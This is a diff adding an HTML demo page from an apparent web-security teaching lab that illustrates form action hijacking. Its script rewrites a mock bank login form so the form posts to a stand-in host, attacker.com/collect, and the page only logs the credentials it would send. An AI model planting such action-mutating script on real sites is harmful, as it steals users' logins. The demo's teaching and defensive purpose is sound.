@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo 08 — Form Action Hijacking | ZENTRIX Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/lab.css">
+<style>
+.form-stage { padding: 30px; }
+.legit-form {
+    background: rgba(0,255,102,0.05);
+    border: 1px solid var(--lab-border);
+    padding: 24px; max-width: 400px;
+    font-family: -apple-system, sans-serif;
+}
+.legit-form h3 { color: #fff; margin-bottom: 16px; font-size: 1rem; }
+.legit-form label { display: block; color: var(--lab-text); font-size: 0.75rem; margin-bottom: 4px; }
+.legit-form input {
+    width: 100%; padding: 10px; margin-bottom: 12px;
+    background: rgba(0,0,0,0.5); border: 1px solid var(--lab-border);
+    color: var(--lab-primary); font-family: inherit;
+}
+.action-display {
+    margin-top: 16px; padding: 10px;
+    background: rgba(255,51,102,0.1);
+    border: 1px solid var(--lab-accent);
+    font-size: 0.75rem; color: var(--lab-accent);
+}
+</style>
+</head>
+<body class="lab-demo">
+<div class="lab-warning">⚠ DEMO 08 — Form Action Hijacking | Authorized research only</div>
+<nav class="lab-nav">
+    <a href="index.html">← VULN LAB</a>
+    <span class="demo-id">DEMO 08 / FORM ACTION HIJACK</span>
+    <a href="../index.html">CONSOLE</a>
+</nav>
+
+<div class="lab-body">
+    <h1 class="lab-title">FORM ACTION HIJACKING</h1>
+    <span class="lab-tag">RUNTIME MUTATION · CREDENTIAL THEFT</span>
+    <p class="lab-desc">
+        Form initially posts to legitimate endpoint. Attacker JavaScript mutates action/method
+        before submit — credentials sent to attacker server while UI appears unchanged.
+    </p>
+
+    <div class="lab-stage">
+        <span class="lab-stage-label">[ SUBMIT LOGIN FORM ]</span>
+        <div class="form-stage">
+            <form id="loginForm" action="https://legitimate-bank.com/login" method="POST" class="legit-form">
+                <h3>🏦 SecureBank Login</h3>
+                <label>Username</label>
+                <input name="username" type="text" value="demo_user">
+                <label>Password</label>
+                <input name="password" type="password" value="demo_pass">
+                <button type="submit" class="lab-btn">Sign In</button>
+                <div class="action-display" id="actionDisplay">
+                    action: https://legitimate-bank.com/login
+                </div>
+            </form>
+        </div>
+    </div>
+    <button class="lab-btn danger" id="hijackBtn">Simulate hijack (mutate action)</button>
+    <div class="lab-log" id="log">[*] Form action is legitimate. Click hijack then submit.</div>
+</div>
+
+<div class="lab-info">
+    <strong>Defense:</strong> Subresource Integrity, strict CSP script-src, form action allowlists server-side validation.
+</div>
+
+<script>
+var form = document.getElementById('loginForm');
+var hijacked = false;
+document.getElementById('hijackBtn').addEventListener('click', function() {
+    form.action = 'https://attacker.com/collect';
+    form.method = 'GET';
+    hijacked = true;
+    document.getElementById('actionDisplay').innerHTML =
+        '<span style="color:#ff3366">action: https://attacker.com/collect (HIJACKED)</span>';
+    document.getElementById('log').innerHTML = '<span class="hit">[!] FORM ACTION MUTATED</span>\nNext submit exfiltrates credentials to attacker.';
+});
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    var data = new FormData(form);
+    var params = new URLSearchParams(data).toString();
+    document.getElementById('log').innerHTML =
+        (hijacked ? '<span class="hit">[!] SUBMIT INTERCEPTED — EXFILTRATED</span>\n' : '<span class="ok">[OK] Legitimate submit</span>\n') +
+        'Would send: ' + params + '\n' +
+        'To: ' + form.action;
+});
+</script>
+</body>
+</html>
